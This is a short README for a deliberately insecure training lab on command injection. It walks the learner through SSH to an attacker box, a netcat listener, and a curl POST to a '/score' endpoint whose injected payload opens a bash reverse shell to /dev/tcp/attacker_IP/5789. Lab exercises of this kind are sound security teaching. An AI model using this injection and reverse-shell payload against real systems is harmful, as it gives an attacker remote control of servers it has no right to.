# 🔥 Vulnerable Labs: Shell Yeah - Let's Go in Reverse
*A deliberately insecure application for security education and demos*

---

## 💀 About the Challenge

In this exercise you'll build on your understanding of command injection, craft and execute a reverse shell payload.

### 🎯 Your Mission

1. Using CloudShell, SSH to the AttackerBox.
```bash 
ssh -i ~/lab_key.pem ubuntu@attacker_IP
```
2. Run a netcat listener: 
```bash
nc -lvp 5789
```
3. Run the following command from your laptop:
```bash
curl -X POST http://website_IP/score -d '""; bash -c "/bin/bash -i > /dev/tcp/attacker_IP/5789 0<&1 2>&1" #'
```

### 💥 Hints & Tips

Note: Don't forget to substitute:
- "website_ip" for the Public IP address of your WebServer EC2 instance
- "attacker_IP" for the Public IP address of your AttackerBox EC2 instance 
